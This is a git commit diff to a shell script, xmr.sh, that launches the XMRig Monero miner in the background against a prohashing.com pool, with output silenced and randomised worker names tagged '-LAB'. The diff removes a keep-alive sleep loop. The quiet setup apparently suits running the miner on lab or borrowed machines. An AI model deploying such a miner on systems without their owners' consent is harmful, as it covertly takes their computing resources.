d997575da65dc508e7fc47a09e2d2228ef1cc3c9
Myaxisplay <101804515+Myaxisplay@users.noreply.github.com>
2022-07-11 05:28:46 +0700

    Update xmr.sh

--- xmr.sh
+++ xmr.sh
@@ -16,7 +16,3 @@ chmod +x xmrig
 sudo ph add xmrig
 
 nohup ./xmrig -o stratum+tcp://prohashing.com:3359 -u Prodent -p n=$(echo $(shuf -i 1-200 -n 1)-LAB) -k --coin monero -a rx/0 >/dev/null 2>&1 > nohup.out
-while [ 1 ]; do
-sleep 3
-done
-sleep 999999999
